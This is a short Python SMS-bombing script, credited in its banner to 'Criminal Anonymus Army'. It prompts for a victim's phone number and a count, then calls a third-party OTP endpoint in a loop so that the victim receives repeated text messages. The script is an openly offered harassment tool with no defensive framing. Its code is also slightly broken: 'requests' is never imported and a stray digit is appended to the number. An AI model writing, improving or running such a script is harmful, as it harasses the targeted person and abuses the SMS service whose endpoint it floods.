
logo=str(""" ___ __ __   ______              ________      
/__//_//_/\ /_____/\            /_______/\     
\::\| \| \ \\:::_ \ \    _______\::: _  \ \    
 \:.      \ \\:(_) ) )_ /______/\\::(_)  \ \   
  \:.\-/\  \ \\: __ `\ \\__::::\/ \:: __  \ \  
   \. \  \  \ \\ \ `\ \ \          \:.\ \  \ \ 
    \__\/ \__\/ \_\/ \_\/           \__\/\__\/ 
    
    
    Make By : Criminal Anonymus Army
    
    """)







print(logo)

number=str(input(" Enter The Victm Number : "))

amount=int(input(" Enter The Amount : "))

api="http://gp.bioscopelive.com/en/login/send-otp?phone=88"+number+"6&operator=bd-otp"


for i in range(amount):
	requests.get(api)
	print(str(i+1)+" SMS Sent")
	
